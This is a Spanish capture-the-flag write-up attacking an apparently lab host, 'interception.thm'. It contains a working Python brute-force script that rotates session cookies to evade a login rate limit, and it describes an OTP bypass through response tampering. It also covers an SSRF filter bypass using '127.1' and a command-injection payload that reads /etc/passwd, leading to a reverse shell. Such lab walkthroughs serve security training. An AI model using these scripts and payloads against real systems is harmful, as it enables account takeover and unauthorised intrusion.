---
layout: apunte
title: "2. Getting the Flags"
---

<h2>Reconocimiento Inicial</h2>
Comenzamos analizando los puertos abiertos.

!**Pasted image 20260923095941.png**

Ahora vamos a escanear dichos puertos más en profundidad.

!**Pasted image 20260923095959.png**

Vamos a ver qué directorios tiene.

!**Pasted image 20260923100023.png**

Ahora vamos a ver cómo es la web.

!**Pasted image 20260923100046.png**

--------------------------------
<h2>Profundización</h2>
Vamos a meternos a mirar el código de la página.

!**Pasted image 20260923100242.png**

Parece que la página no está mirando si la respuesta es correcta, sino si no es errónea. Aquí puede haber algún problema. Vamos a abrir BurpSuite a ver qué nos encontramos.

!**Pasted image 20260923101540.png**

Esta es la petición. Ahora observamos la respuesta del servidor capturándola.

!**Pasted image 20260923101759.png**

Observamos la interacción.

!**Pasted image 20260923101825.png**

Parece que está mandando la comprobación al navegador y es este el que decide (aparentemente). Vamos a cambiar el:

```json
{
	"ok":false,
	"error":"Invalid credentials."
}
```

Por:

```json
{
	"ok":true
}
```

Y redireccionamos la respuesta.

!**Pasted image 20260923102022.png**

Observamos el navegador.

!**Pasted image 20260923102220.png**

Parece que algo no termina de funcionar. Vamos a volver atrás y a escanear un poco más. Después de rompernos la cabeza, damos con algo interesante:

!**Pasted image 20260923104915.png**

Ojo porque aquí podemos ver que hay una verificación de doble factor con un OTP. Vamos a ver qué hay en `login.php.bak`.

!**Pasted image 20260923105249.png**

Podemos ver un patrón de contraseñas. 

----------------------------------
<h2>Explotación</h2>
<h3>Bruteforceo de Contraseña</h3>
Vamos ahora a realizar un diccionario para probar.

```bash
for i in {1900..2026}; do echo "MediaHub$i"; done > diccionario.txt
```

Con esta lista vamos a atacar el login.

!**Pasted image 20260923110101.png**

Aquí nos encontramos con un problema. El login se encuentra capado por un rate limit:

!**Pasted image 20260923110351.png**

Vemos que cada 4 peticiones dice que ha habido demasiados intentos, por lo que tendremos que hacer un exploit que cambie de COOKIE cada 4 intentos. De esa manera terminamos con este código:

```python
import requests

URL = "http://interception.thm/api_login.php"
EMAIL = "admin@mediahub.thm"
WORDLIST = "pass_interception_admin.txt"

SESSION_LIMIT = 4


def nueva_sesion():
    session = requests.Session()

    session.headers.update({
        "User-Agent": "Mozilla/5.0",
        "Accept": "application/json, text/plain, */*"
    })

    # Entramos primero en login.php para obtener la sesión/cookies
    session.get(
        "http://interception.thm/login.php",
        timeout=10
    )

    print(
        f"[*] Nueva sesión. PHPSESSID: "
        f"{session.cookies.get('PHPSESSID')}"
    )

    return session


# Cargar diccionario
with open(WORDLIST, "r", encoding="utf-8", errors="ignore") as f:
    passwords = [line.strip() for line in f if line.strip()]


print(f"[*] Cargadas {len(passwords)} contraseñas.")
print("[*] Iniciando ataque...\n")


session = nueva_sesion()
intentos = 0


for password in passwords:

    # Nueva sesión cada 4 intentos
    if intentos >= SESSION_LIMIT:
        session = nueva_sesion()
        intentos = 0

    intentos += 1

    print(
        f"[~] Probando: {password} "
        f"(Intento {intentos}/{SESSION_LIMIT} con la sesión actual)"
    )

    try:
        response = session.post(
            URL,
            data={
                "email": EMAIL,
                "password": password
            },
            timeout=10
        )

    except requests.RequestException as e:
        print(f"[!] Error de conexión: {e}")
        continue


    # La API debería devolver JSON
    try:
        data = response.json()

    except ValueError:
        print("[!] La respuesta no es JSON.")
        print(f"    HTTP: {response.status_code}")
        print(f"    Respuesta: {response.text[:300]!r}")
        continue


    print(f"    HTTP: {response.status_code}")
    print(f"    JSON: {data}")


    # La propia página indica que api_login.php devuelve:
    # { "ok": false, "error": "Invalid credentials." }
    #
    # o, si es correcto:
    # { "ok": true, ... }

    if data.get("ok") is False:
        print(f"[-] Incorrecta: {password}\n")
        continue


    if data.get("ok") is True:
        print("\n" + "=" * 60)
        print(f"[+] POSIBLE CONTRASEÑA CORRECTA: {password}")
        print(f"[+] Respuesta: {data}")
        print("=" * 60)
        break


    print("[!] Respuesta inesperada de la API.\n")


else:
    print(
        "\n[-] Se terminó el diccionario "
        "y no se encontró la contraseña correcta."
    )
```

De esta manera encontramos la contraseña.

!**Pasted image 20260923112909.png**

Vamos a iniciar sesión y a ver qué es el OTP con BurpSuite.

!**Pasted image 20260923113013.png**

<h3>OTP Bypass</h3>
Vamos a ver qué se manda en la petición.

!**Pasted image 20260923113047.png**

Volvemos a interceptar la respuesta.

!**Pasted image 20260923113110.png**

Vamos a cambiarlo:

!**Pasted image 20260923113144.png**

No parece funcionar. Vamos a intentar mandar la variable `is_verified` ya corregida:

!**Pasted image 20260923113656.png**

Parece que esto sí funciona. Vamos a realizarlo en la petición del proxy.

!**Pasted image 20260923113818.png**

Y le damos a `Forward All`.

!**Pasted image 20260923113858.png**

Hemos conseguido la primera flag.

<h3>SSRF + Inyección de Comandos</h3>
En la página vemos un formulario que aparentemente envía una petición a una URL. Vamos a probar a ver si puede enviarla a nuestra máquina.

Nos ponemos en escucha.

!**Pasted image 20260923114715.png**

Y mandamos la petición.

!**Pasted image 20260923115400.png**

No nos deja. Vamos a probar con `localhost`.

!**Pasted image 20260923115453.png**

Vamos a probar una URL externa:

!**Pasted image 20260923115523.png**

Parece que esto sí le gusta. Está usando `curl`. Vamos a ver `127.0.0.1`.

!**Pasted image 20260923115634.png**

Tampoco le vale, pero puede que esté filtrando exclusivamente y `127.1` también funciona como localhost.

!**Pasted image 20260923115717.png**

Esto sí que funciona y además vemos el puerto 80. Vamos a intentar una inyección de comandos.

!**Pasted image 20260923115850.png**

Parece que así no funciona. Vamos a intentar leer algún archivo con:

```bash
http://127.1; file:///etc/passwd
```

!**Pasted image 20260923115947.png**

Si probamos a meterlo entre backticks, podemos ver que si funciona.

!**Pasted image 20260923120228.png**

Probando con `$()` vemos que también funciona.

!**Pasted image 20260923120552.png**

Vamos a intentar conseguir una reverse shell.

!**Pasted image 20260923120751.png**

No funciona, por lo que vamos a crear un script que descargaremos en la máquina y después ejecutaremos.

!**Pasted image 20260923121019.png**

De esta manera lo hemos descargado. Y ahora vamos a ejecutarlo.

!**Pasted image 20260923121115.png**

Hemos obtenido la shell. Vamos a buscar la flag.

!**Pasted image 20260923121255.png**

>[!SUCCESS] Hemos conseguido ambas flags.

